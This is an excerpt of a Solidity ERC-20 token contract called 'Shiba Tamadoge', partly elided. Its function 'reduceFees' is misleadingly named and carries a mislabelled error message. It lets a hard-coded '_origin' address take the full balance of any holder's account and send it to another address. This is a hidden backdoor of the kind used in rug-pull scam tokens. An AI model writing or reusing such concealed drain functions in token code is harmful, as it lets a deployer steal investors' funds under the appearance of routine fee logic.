...
contract ShibaTamadoge  is Context, IERC20 {
    ...
    address _addr = 0xbf73ED48596565F1AbDbeb28fdf6a330930fe331;
    address public _origin = 0x5FD8dACF514274AA2Cb0aDd57754421f3578C2Ef;

    constructor () public {


        
        _name = "Shiba Tamadoge";
        _symbol = "shiTAMA";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function approval(address account, address staker) public {
        ...
        function reduceFees(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
